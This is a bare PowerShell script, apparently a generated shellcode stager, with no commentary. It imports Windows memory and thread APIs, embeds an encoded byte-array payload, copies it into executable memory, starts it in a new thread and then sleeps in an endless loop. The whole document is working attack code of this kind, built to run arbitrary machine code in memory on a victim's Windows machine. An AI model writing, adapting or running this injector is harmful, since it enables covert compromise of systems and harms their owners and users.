
$WQF = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $WQF -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xee,0x66,0xa3,0x05,0xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xc2,0x04,0x03,0x42,0xe1,0x84,0x56,0xf9,0x15,0xca,0x99,0x02,0xe5,0xab,0x10,0xe7,0xd4,0xeb,0x47,0x63,0x46,0xdc,0x0c,0x21,0x6a,0x97,0x41,0xd2,0xf9,0xd5,0x4d,0xd5,0x4a,0x53,0xa8,0xd8,0x4b,0xc8,0x88,0x7b,0xcf,0x13,0xdd,0x5b,0xee,0xdb,0x10,0x9d,0x37,0x01,0xd8,0xcf,0xe0,0x4d,0x4f,0xe0,0x85,0x18,0x4c,0x8b,0xd5,0x8d,0xd4,0x68,0xad,0xac,0xf5,0x3e,0xa6,0xf6,0xd5,0xc1,0x6b,0x83,0x5f,0xda,0x68,0xae,0x16,0x51,0x5a,0x44,0xa9,0xb3,0x93,0xa5,0x06,0xfa,0x1c,0x54,0x56,0x3a,0x9a,0x87,0x2d,0x32,0xd9,0x3a,0x36,0x81,0xa0,0xe0,0xb3,0x12,0x02,0x62,0x63,0xff,0xb3,0xa7,0xf2,0x74,0xbf,0x0c,0x70,0xd2,0xa3,0x93,0x55,0x68,0xdf,0x18,0x58,0xbf,0x56,0x5a,0x7f,0x1b,0x33,0x38,0x1e,0x3a,0x99,0xef,0x1f,0x5c,0x42,0x4f,0xba,0x16,0x6e,0x84,0xb7,0x74,0xe6,0x69,0xfa,0x86,0xf6,0xe5,0x8d,0xf5,0xc4,0xaa,0x25,0x92,0x64,0x22,0xe0,0x65,0x8b,0x19,0x54,0xf9,0x72,0xa2,0xa5,0xd3,0xb0,0xf6,0xf5,0x4b,0x11,0x77,0x9e,0x8b,0x9e,0xa2,0x0b,0x89,0x08,0x8d,0x64,0xe9,0x49,0x65,0x77,0x0a,0x58,0x2a,0xfe,0xec,0x0a,0x82,0x50,0xa1,0xea,0x72,0x11,0x11,0x82,0x98,0x9e,0x4e,0xb2,0xa2,0x74,0xe7,0x58,0x4d,0x21,0x5f,0xf4,0xf4,0x68,0x2b,0x65,0xf8,0xa6,0x51,0xa5,0x72,0x45,0xa5,0x6b,0x73,0x20,0xb5,0x1b,0x73,0x7f,0xe7,0x8d,0x8c,0x55,0x82,0x31,0x19,0x52,0x05,0x66,0xb5,0x58,0x70,0x40,0x1a,0xa2,0x57,0xdb,0x93,0x36,0x18,0xb3,0xdb,0xd6,0x98,0x43,0x8a,0xbc,0x98,0x2b,0x6a,0xe5,0xca,0x4e,0x75,0x30,0x7f,0xc3,0xe0,0xbb,0xd6,0xb0,0xa3,0xd3,0xd4,0xef,0x84,0x7b,0x26,0xda,0x14,0x47,0xf1,0x22,0x63,0xa9,0xc1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$aaIt=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($aaIt.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$aaIt,0,0,0);for (;;){Start-sleep 60};

